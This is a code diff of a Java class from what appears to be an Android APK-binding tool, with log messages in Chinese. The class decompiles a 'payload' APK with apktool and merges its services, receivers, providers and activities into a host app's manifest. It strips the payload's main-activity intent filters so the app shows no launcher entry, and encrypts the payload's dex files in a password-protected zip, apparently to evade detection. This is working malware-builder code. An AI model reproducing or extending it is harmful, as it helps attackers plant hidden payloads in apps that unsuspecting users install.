@@ -6,46 +6,38 @@ import net.lingala.zip4j.model.ZipParameters;
 import net.lingala.zip4j.model.enums.CompressionMethod;
 import net.lingala.zip4j.model.enums.EncryptionMethod;
 import org.dom4j.*;
-import org.dom4j.io.SAXReader;
-import org.dom4j.io.XMLWriter;
 
-import java.io.File;
-import java.io.FileWriter;
-import java.io.IOException;
+import java.io.*;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 
 import java.util.Random;
 
+import static org.a520apkhook.CmdUtils.*;
+
 
 public class GetPayloadApkInfo {
     private final String TAG = "GetPayloadApkInfo";
-    HackApk hackApk = new HackApk();
 
     public GetPayloadApkInfo() {
         // 初始化, 打开apk文件
     }
 
     public Boolean decodeApkFile (){
-        LogUtils.info(TAG, "使用apktool反编译 Payload Apk, " + Config.payloadApkFilePath);
-        return hackApk.runJar(new File(Config.apkToolFilePath), new String[]{"d", Config.payloadApkFilePath, "-s", "-f", "-o", Config.payloadApkDecodeDir});
+        LogUtils.info(TAG, "使用apktool反编译 Payload Apk, " + Config.byPassPayloadApkFilePath);
+        return RunCommand(new File(Config.apkToolFilePath), new String[]{"d", Config.byPassPayloadApkFilePath, "-s", "-f", "-o", Config.payloadApkDecodeDir});
     }
 
-    public Boolean getApkMetaInfo(){
-        LogUtils.info(TAG, "解析 Payload Apk 的AndroidManifest.xml文件, 并创建新的 AndroidManifest-New.xml文件. ");
+    public Boolean getPayloadApkInfo(){
+        LogUtils.info(TAG, "解析 Payload Apk 的AndroidManifest.xml文件, 并提取service、meta-data、receiver、activity、provider到新的 AndroidManifest-New.xml 文件. ");
 
         File xmlFile = new File(Config.payloadApkDecodeDir + "/AndroidManifest.xml");
-        SAXReader xmlReader = new SAXReader();
-        Document document;
-        try {
-            document = xmlReader.read(xmlFile);
-        } catch (DocumentException e) {
-            e.printStackTrace();
-            return false;
-        }
+        Document document = readXmlFile(xmlFile);
+
         Element rootElement = document.getRootElement();
         LogUtils.debug(TAG, rootElement.element("application").toString());
+
         if (rootElement.attribute("package") != null){
             Config.payloadApkPackageName = rootElement.attribute("package").getStringValue();
         }
@@ -100,7 +92,6 @@ public class GetPayloadApkInfo {
             }
             applicationNode.add(providerElement.createCopy());
         }
-        LogUtils.debug(TAG, providerElements.toString());
 
         // 获取所有名为<activity>的子节点
         List<Element> activityElements = rootElement.element("application").elements("activity");
@@ -110,37 +101,35 @@ public class GetPayloadApkInfo {
             if (activityElement.attribute("name").getStringValue().startsWith(".")){
                 activityElement.addAttribute("name", Config.payloadApkPackageName + activityElement.attribute("name").getStringValue());
             }
-
             Node actionNode = activityElement.selectSingleNode("intent-filter/action[@android:name='android.intent.action.MAIN']");
             if (actionNode == null) {
                 applicationNode.add(activityElement.createCopy());
             }else {
-
                 Config.payloadApkMainActivityName = activityElement.attribute("name").getStringValue();
-
-                Element tempActivityNode =  applicationNode.addElement("activity");
-                tempActivityNode.addAttribute("android:name", Config.payloadApkMainActivityName);
-                tempActivityNode.addAttribute("android:excludeFromRecents", "true");
-
+                // 移除 activityElement 的所有子元素
+                List<Element> childElements = new ArrayList<>(activityElement.elements());
+                for (Element childElement : childElements) {
+                    activityElement.remove(childElement);
+                }
+                // 将处理过的 activityElement 添加到 applicationNode
+                applicationNode.add(activityElement.createCopy());
                 LogUtils.info(TAG, "成功获取到 Payload Apk 的MainActivityName. ");
             }
         }
-        LogUtils.debug(TAG, activityElements.toString());
+
+//        LogUtils.debug(TAG, activityElements.toString());
 
         Config.payloadApkNewManifestFile = Config.payloadApkDecodeDir + "/AndroidManifest-New.xml";
 
-        try (FileWriter fileWriter = new FileWriter(new File(Config.payloadApkNewManifestFile))) {
-            XMLWriter writer = new XMLWriter(fileWriter);
-            writer.write( newDocument );
-            writer.close();
-             LogUtils.info(TAG, "获取 payload Apk 文件中的Provider、Receiver、Service、Meta-data、Activity成功.");
-        } catch (IOException e) {
+        if(writeXmlFile(newDocument, new File(Config.payloadApkNewManifestFile))){
+            LogUtils.info(TAG, "获取 payload Apk 文件中的Provider、Receiver、Service、Meta-data、Activity成功.");
+        }else {
             LogUtils.error(TAG, "写入模板App的string.xml文件失败.");
-            e.printStackTrace();
             return false;
         }
         return true;
     }
+
     public String generatePassword(int length) {
         String passwordSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
         char[] password = new char[length];
@@ -151,8 +140,9 @@ public class GetPayloadApkInfo {
         }
         return new String(password);
     }
+
     public Boolean zipAndEncryptFiles() {
-        LogUtils.info(TAG, "尝试对 Payload Apk的dex文件进行加密压缩. " + Config.payloadApkFilePath);
+        LogUtils.info(TAG, "尝试对 Payload Apk的dex文件进行加密压缩. " + Config.payloadApkDecodeDir);
 
         Config.payloadApkDexZipFilePath = Config.payloadApkDecodeDir + "/classes.zip";
         Config.payloadApkDexZipFilePass = generatePassword(8);
@@ -178,12 +168,9 @@ public class GetPayloadApkInfo {
             zipFile.addFiles(dexFileList, zipParameters);
         }
         catch (ZipException e){
-            e.printStackTrace();
+            LogUtils.warn(TAG, "无法打包 Payload Apk 的 dex 文件: " + e.getMessage());
             return false;
         }
         return true;
     }
-
-
-
 }
